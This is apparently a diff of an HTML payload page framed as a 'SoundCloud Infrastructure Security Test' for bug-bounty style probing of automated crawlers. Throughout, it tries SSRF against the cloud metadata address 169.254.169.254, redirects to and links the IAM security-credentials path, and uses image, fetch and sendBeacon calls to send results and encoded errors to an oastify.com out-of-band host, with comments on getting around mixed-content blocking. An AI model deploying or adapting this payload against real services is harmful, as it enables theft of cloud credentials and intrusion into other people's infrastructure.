@@ -2,42 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Infrastructure Security Validation</title>
+    <title>SoundCloud Infrastructure Security Test</title>
     
-    <meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/hostname">
+    <meta http-equiv="refresh" content="5; url=http://169.254.169.254/latest/meta-data/hostname">
 
     <script>
         window.onload = function() {
-            const oast = "ie0z38xjt8769e7sxsendgn17sdj19py.oastify.com";
+            // ALWAYS use HTTPS for your OAST link to prevent 'Mixed Content' blocks
+            const oast = "https://ie0z38xjt8769e7sxsendgn17sdj19py.oastify.com";
             const target = "http://169.254.169.254/latest/meta-data/hostname";
 
-            // LAYER 2: PASSIVE IMAGE PROBE (Bypasses 'Mixed Content' block)
-            // Browsers often allow HTTP images on HTTPS pages.
-            // If the worker hits this, the 'onerror' triggers a ping back to you.
-            const img = new Image();
-            img.src = target;
-            img.onerror = function() {
-                navigator.sendBeacon("https://" + oast + "/probe_hit?type=image_onerror");
+            // 2. PASSIVE PROBE: Browsers allow HTTP images on HTTPS pages more freely.
+            // If the bot reaches the IP, this 'onerror' (triggered by raw text) pings you.
+            const probe = new Image();
+            probe.src = target;
+            probe.onerror = () => {
+                navigator.sendBeacon(oast + "/probe?type=image_hit");
             };
 
-            // LAYER 3: ADVANCED FETCH (Targets Headless Browsers)
-            fetch(target, { mode: 'no-cors' })
+            // 3. ADVANCED FETCH: Proves code execution even if the IP is blocked.
+            fetch(target, { mode: 'no-cors', keepalive: true })
                 .then(() => {
-                    navigator.sendBeacon("https://" + oast + "/probe_hit?type=fetch_success");
+                    navigator.sendBeacon(oast + "/probe?type=fetch_success");
                 })
                 .catch((err) => {
-                    // This will ping your OAST even if it's blocked by Mixed Content,
-                    // proving the code at least attempted to run on the worker.
-                    const log = new Image();
-                    log.src = "https://" + oast + "/probe_failed?reason=" + btoa(err.message);
+                    // This exfiltrates the internal error to you.
+                    // If you see 'Failed to fetch', it proves your XSS is ALIVE.
+                    navigator.sendBeacon(oast + "/probe?type=xss_executed&error=" + btoa(err.message));
                 });
         };
     </script>
 </head>
 <body>
     <h1>SoundCloud Validation Node</h1>
+    <p>Automated Worker Detected. Trace: <span id="trace">Active</span></p>
     <hr>
-    <p>Automated crawler detected. If redirection fails, verify internal path:</p>
-    <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">Internal Credentials Access</a>
+    <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">Verify Internal Credentials Path</a>
 </body>
 </html>
